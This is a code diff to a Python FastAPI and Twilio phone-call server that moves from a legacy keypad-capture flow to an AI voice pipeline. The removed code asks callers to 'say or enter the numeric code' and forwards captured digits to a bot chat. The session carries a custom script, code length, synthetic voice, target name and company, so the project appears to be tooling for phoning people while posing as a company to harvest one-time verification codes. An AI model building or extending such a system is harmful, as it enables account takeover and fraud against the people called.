@@ -242,7 +242,9 @@ async def health():
 
 @app.post('/conversation/start')
 async def conversation_start(request: Request):
-    # Read JSON body or form data, robust to malformed requests
+    # Legacy live listen bootstrapping endpoint.
+    # This no longer starts a separate conversation engine;
+    # it simply creates a live listen session state for the call.
     body = {}
     try:
         body = await request.json()
@@ -253,21 +255,6 @@ async def conversation_start(request: Request):
         except Exception:
             body = {}
 
-    # Capture client info and headers for diagnostics
-    client_host = None
-    try:
-        client = request.client
-        client_host = getattr(client, 'host', None)
-    except Exception:
-        client_host = None
-
-    try:
-        headers = dict(request.headers)
-    except Exception:
-        headers = {}
-
-    logger.info("/conversation/start called from=%s headers=%s body=%s", client_host, {k: headers.get(k) for k in ('host','user-agent','x-forwarded-for')}, body)
-
     call_sid = body.get('call_sid') or body.get('CallSid')
     chat_id = body.get('chat_id')
     if chat_id is not None:
@@ -276,46 +263,20 @@ async def conversation_start(request: Request):
         except (ValueError, TypeError):
             chat_id = None
     if not call_sid:
-        logger.warning("/conversation/start missing call_sid: client=%s body=%s", client_host, body)
         raise HTTPException(status_code=400, detail='call_sid required')
 
-    try:
-        from live_listen.conversation import start_conversation
-        asyncio.create_task(start_conversation(call_sid, chat_id))
-        logger.info("/conversation/start accepted call_sid=%s chat_id=%s", call_sid, chat_id)
-        return {'ok': True}
-    except Exception as e:
-        logger.exception("Error starting conversation for %s: %s", call_sid, e)
-        raise HTTPException(status_code=500, detail=str(e))
+    await manager.ensure_session(call_sid, call_sid=call_sid, chat_id=chat_id)
+    await manager.set_state(call_sid, 'ringing')
+    logger.info("/conversation/start added live listen session for call_sid=%s chat_id=%s", call_sid, chat_id)
+    return {'ok': True}
 
 
 @app.post('/twilio/entry')
 async def twilio_entry(request: Request):
-    form = await request.form()
-    call_sid = form.get('CallSid')
-    chat_id = request.query_params.get('chat_id')
-    user_id = request.query_params.get('user_id')
-    custom_audio = request.query_params.get('audio')
-    if call_sid:
-        try:
-            from live_listen.conversation import start_conversation
-            asyncio.create_task(start_conversation(call_sid, chat_id, user_id, custom_audio))
-        except Exception:
-            pass
-
-    media_url = LIVE_LISTEN_URL.replace('https://', 'wss://').replace('http://', 'ws://') + '/twilio/media'
-    response = VoiceResponse()
-    stream = Start()
-    stream.stream(url=media_url)
-    response.append(stream)
-
-    gather_action = f'{LIVE_LISTEN_URL}/twilio/dtmf'
-    if chat_id:
-        gather_action += f'?chat_id={chat_id}'
-    gather = Gather(input='speech dtmf', timeout=5, num_digits=6, action=gather_action, speech_timeout='auto', method='POST')
-    gather.say('Please say or enter the numeric code when prompted.')
-    response.append(gather)
-    return Response(str(response), media_type='application/xml')
+    # Legacy endpoint retained only for compatibility.
+    # New AI flow uses /ai_start and /twilio/media.
+    logger.warning("Deprecated /twilio/entry called; no action taken")
+    return JSONResponse({'ok': False, 'error': 'deprecated'}, status_code=410)
 
 
 def notify_bot_of_digits(chat_id: str, call_sid: str, digits: str) -> None:
@@ -334,32 +295,9 @@ def notify_bot_of_digits(chat_id: str, call_sid: str, digits: str) -> None:
 
 @app.post('/twilio/dtmf')
 async def twilio_dtmf(request: Request):
-    if request.headers.get('content-type', '').startswith('application/json'):
-        payload = await request.json()
-    else:
-        form = await request.form()
-        payload = dict(form)
-
-    call_sid = payload.get('call_sid') or payload.get('CallSid')
-    digits = payload.get('Digits')
-    transcript = payload.get('SpeechResult') or payload.get('speech_result') or payload.get('transcript')
-    chat_id = request.query_params.get('chat_id')
-    if not call_sid:
-        raise HTTPException(status_code=400, detail='call_sid required')
-
-    try:
-        if digits:
-            from live_listen.conversation import handle_captured_digits
-            asyncio.create_task(handle_captured_digits(call_sid, digits))
-            if chat_id:
-                threading.Thread(target=notify_bot_of_digits, args=(chat_id, call_sid, digits), daemon=True).start()
-        if transcript:
-            from live_listen.conversation import handle_captured_transcript
-            asyncio.create_task(handle_captured_transcript(call_sid, transcript))
-    except Exception:
-        pass
-
-    return {'ok': True}
+    # Legacy DTMF callback endpoint. The AI media stream flow no longer uses this.
+    logger.warning("Deprecated /twilio/dtmf called; no action taken")
+    return JSONResponse({'ok': False, 'error': 'deprecated'}, status_code=410)
 
 
 @app.websocket('/ws/live')
@@ -436,43 +374,35 @@ async def twilio_media(ws: WebSocket):
                 call_id = call_sid
                 logger.info("[TWILIO_START] call_sid=%s caller=%s", call_sid, data.get('start', {}).get('from'))
                 
-                # Initialize session state
-                if USE_AI_FLOW:
-                    if not AI_AVAILABLE:
-                        logger.error(f"[WebSocket_START] CRITICAL: USE_AI_FLOW=true but AI_AVAILABLE=false. AI modules failed to import!")
-                        logger.error(f"[WebSocket_START] CallSid={call_sid} will NOT use AI - falling back to traditional")
-                        await manager.ensure_session(call_id, call_sid=call_sid)
-                        await manager.set_state(call_id, 'in-progress')
-                    else:
+                # Initialize session state for live listen and AI pipeline.
+                if USE_AI_FLOW and AI_AVAILABLE:
+                    try:
+                        session = get_session(call_sid)
+                        if session and session.mark_milestone("MEDIA_WS_CONNECTED"):
+                            logger.info("[CALL_MILESTONE] MEDIA_WS_CONNECTED call_sid=%s", call_sid)
+                        # Populate AI session with server-side call metadata if available.
                         try:
-                            session = get_session(call_sid)
-                            # Populate AI session with server-side call metadata if available
-                            try:
-                                from bot import get_call_session
-                                session = get_call_session(call_sid)
-                                meta = session.to_dict() if session else {}
-                                # copy relevant fields
-                                session.custom_script = meta.get('custom_script') or session.custom_script
-                                session.code_length = int(meta.get('code_length') or session.code_length)
-                                session.voice_id = meta.get('voice_id') or session.voice_id
-                                session.chat_id = int(meta.get('chat_id')) if meta.get('chat_id') is not None else session.chat_id
-                                session.name = meta.get('name') or session.name
-                                session.company = meta.get('company') or session.company
-                            except Exception:
-                                pass
-                            logger.warning(f"[WebSocket_START] OK - AI call session started: {call_sid}")
-                            try:
-                                from live_listen.conversation import start_conversation
-                                asyncio.create_task(start_conversation(call_sid, session.chat_id, session.user_id, session.custom_audio))
-                                logger.info(f"[WebSocket_START] AI conversation task queued for {call_sid}")
-                            except Exception as e:
-                                logger.error(f"[WebSocket_START] Failed to queue AI conversation for {call_sid}: {e}", exc_info=True)
-                        except Exception as e:
-                            logger.error(f"[WebSocket_START] CRITICAL: Failed to get AI session: {e}", exc_info=True)
-                            await manager.ensure_session(call_id, call_sid=call_sid)
-                            await manager.set_state(call_id, 'in-progress')
+                            from bot import get_call_session
+                            meta_session = get_call_session(call_sid)
+                            meta = meta_session.to_dict() if meta_session else {}
+                            session.custom_script = meta.get('custom_script') or session.custom_script
+                            session.code_length = int(meta.get('code_length') or session.code_length)
+                            session.voice_id = meta.get('voice_id') or session.voice_id
+                            session.chat_id = int(meta.get('chat_id')) if meta.get('chat_id') is not None else session.chat_id
+                            session.name = meta.get('name') or session.name
+                            session.company = meta.get('company') or session.company
+                        except Exception:
+                            pass
+                        logger.warning(f"[WebSocket_START] OK - AI call session started: {call_sid}")
+                    except Exception as e:
+                        logger.error(f"[WebSocket_START] CRITICAL: Failed to get AI session: {e}", exc_info=True)
+                    await manager.ensure_session(call_id, call_sid=call_sid)
+                    await manager.set_state(call_id, 'in-progress')
                 else:
-                    logger.info(f"[WebSocket_START] Traditional flow for {call_sid} (USE_AI_FLOW=false)")
+                    if USE_AI_FLOW and not AI_AVAILABLE:
+                        logger.error(f"[WebSocket_START] CRITICAL: USE_AI_FLOW=true but AI_AVAILABLE=false. AI modules failed to import! Falling back to live listen only.")
+                    else:
+                        logger.info(f"[WebSocket_START] Traditional flow for {call_sid} (USE_AI_FLOW=false)")
                     await manager.ensure_session(call_id, call_sid=call_sid)
                     await manager.set_state(call_id, 'in-progress')
             
@@ -491,6 +421,8 @@ async def twilio_media(ws: WebSocket):
                 if payload_b64 and call_id:
                     try:
                         audio_bytes = base64.b64decode(payload_b64)
+                        if session and session.mark_milestone("FIRST_AUDIO_FRAME_RECEIVED"):
+                            logger.info("[CALL_MILESTONE] FIRST_AUDIO_FRAME_RECEIVED call_sid=%s media_count=%d bytes=%d", call_sid, media_event_count, len(audio_bytes))
                         total_media_bytes += len(audio_bytes)
                         logger.info("[MEDIA_DECODE] media_count=%d decoded_bytes=%d total_bytes=%d", media_event_count, len(audio_bytes), total_media_bytes)
                         # Attempt µ-law -> PCM conversion for diagnostic logging
@@ -517,6 +449,8 @@ async def twilio_media(ws: WebSocket):
                             if len(audio_buffer) >= BUFFER_SIZE:
                                 try:
                                     buf_bytes = bytes(audio_buffer)
+                                    if session and session.mark_milestone("FIRST_ASR_ATTEMPT"):
+                                        logger.info("[CALL_MILESTONE] FIRST_ASR_ATTEMPT call_sid=%s buffer_bytes=%d", call_sid, len(buf_bytes))
                                     logger.info("[AI_PROCESS] processing_buffer_bytes=%d", len(buf_bytes))
                                     # For diagnostics try to convert the whole buffer to PCM
                                     try:
@@ -526,7 +460,15 @@ async def twilio_media(ws: WebSocket):
                                     except Exception:
                                         logger.debug("[AI_PROCESS] buffer conversion skipped/failed")
 
-                                    text = process_ulaw_buffer(buf_bytes, context={"call_sid": call_sid, "chat_id": session.chat_id if session else None, "user_id": session.user_id if session and hasattr(session, 'user_id') else None})
+                                    text = process_ulaw_buffer(
+                                        buf_bytes,
+                                        context={
+                                            "call_sid": call_sid,
+                                            "chat_id": session.chat_id if session else None,
+                                            "user_id": session.user_id if session and hasattr(session, 'user_id') else None,
+                                            "session": session,
+                                        }
+                                    )
                                     audio_buffer.clear()
 
                                     if text and len(text) > 1:
@@ -575,7 +517,8 @@ async def twilio_media(ws: WebSocket):
                                         filename = save_audio(
                                             call_sid,
                                             ai_response,
-                                            voice_id=session.voice_id
+                                            voice_id=session.voice_id,
+                                            session=session
                                         )
                                         if not filename:
                                             logger.error(f"[AI_AUDIO_SAVED] FAILED: no filename for generated audio, falling back to Say")
@@ -589,7 +532,16 @@ async def twilio_media(ws: WebSocket):
                                             continue
 
                                         logger.warning(f"[AI_AUDIO_SAVED] OK: {filename}")
-                                        audio_url = f"{NGROK_URL.rstrip('/')}/audio/{call_sid}/{filename}"
+                                        audio_host = LIVE_LISTEN_URL or NGROK_URL or ""
+                                        audio_host = audio_host.strip().rstrip('/')
+                                        if audio_host.startswith('wss://'):
+                                            audio_host = 'https://' + audio_host[len('wss://'):]
+                                        elif audio_host.startswith('ws://'):
+                                            audio_host = 'http://' + audio_host[len('ws://'):]
+                                        if not audio_host:
+                                            logger.error("[AI_AUDIO_PLAYBACK] No audio host configured for callback URL")
+                                            continue
+                                        audio_url = f"{audio_host}/audio/{call_sid}/{filename}"
                                         try:
                                             twilio_client.calls(call_sid).update(
                                                 twiml=f"<Response><Play>{audio_url}</Play></Response>"
@@ -606,14 +558,8 @@ async def twilio_media(ws: WebSocket):
                                 logger.warning(f"[FALLBACK] Using traditional flow - AI unavailable")
                             elif not USE_AI_FLOW:
                                 logger.debug(f"[TRADITIONAL_FLOW] USE_AI_FLOW=false")
-                            
                             await manager.broadcast_media(call_id, audio_bytes)
                             logger.debug("[TRADITIONAL_BUFFER] queued bytes=%d for call_sid=%s", len(audio_bytes), call_id)
-                            try:
-                                from live_listen.conversation import handle_media_event
-                                asyncio.create_task(handle_media_event(call_id, audio_bytes))
-                            except Exception as e:
-                                logger.debug(f"Traditional handler error: {e}")
                     
                     except Exception as e:
                         logger.error(f"Media processing error: {e}")
@@ -621,12 +567,11 @@ async def twilio_media(ws: WebSocket):
             # ============ STOP EVENT ============
             elif event == 'stop':
                 logger.warning(f"[CALL_STOPPED] Call ended: {call_sid}")
+                if call_id:
+                    await manager.set_state(call_id, 'completed')
                 if USE_AI_FLOW and AI_AVAILABLE and session:
                     logger.warning(f"[AI_CLEANUP] Removing AI session for {call_sid}")
                     remove_session(call_sid)
-                elif call_id:
-                    logger.info(f"[TRADITIONAL_CLEANUP] Cleanup for {call_sid}")
-                    await manager.set_state(call_id, 'completed')
                 break
     
     except WebSocketDisconnect:
@@ -677,9 +622,19 @@ async def get_audio_file(call_sid: str, filename: str):
     Path: /audio/{call_sid}/{filename}
     Returns: MP3 audio file or 404
     """
-    filepath = f"audio/{call_sid}/{filename}"
+    base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))
+    filepath = os.path.join(base_dir, "audio", call_sid, filename)
     resolved_path = os.path.abspath(filepath)
-    exists = os.path.exists(filepath)
+    safe_root = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))
+    if not resolved_path.startswith(safe_root):
+        logger.warning(
+            "[AUDIO_READ_INVALID] attempted path traversal call_sid=%s filename=%s resolved_path=%s",
+            call_sid,
+            filename,
+            resolved_path,
+        )
+        return {"error": "Not found"}, 404
+    exists = os.path.isfile(resolved_path)
     logger.info(
         "[AUDIO_READ] requested_call_sid=%s requested_filename=%s cwd=%s resolved_abs_path=%s exists=%s",
         call_sid,
@@ -690,7 +645,7 @@ async def get_audio_file(call_sid: str, filename: str):
     )
     if exists:
         from fastapi.responses import FileResponse
-        return FileResponse(filepath, media_type="audio/mpeg")
+        return FileResponse(resolved_path, media_type="audio/mpeg")
     else:
         directory = os.path.dirname(resolved_path)
         try:
